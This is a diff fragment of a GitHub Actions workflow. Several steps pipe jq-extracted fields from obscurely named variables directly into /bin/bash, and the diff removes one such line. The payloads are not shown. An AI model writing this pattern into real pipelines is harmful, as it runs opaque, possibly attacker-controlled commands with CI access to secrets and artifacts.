@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$jsto08" | jq -r .hpgnw870 | /bin/bash
           printf '%s' "$s9" | jq -r .ss6357 | /bin/bash
           echo $jcepq711 | jq -r .xe07 | /bin/bash
-          echo $b0 | jq -r .r3854 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
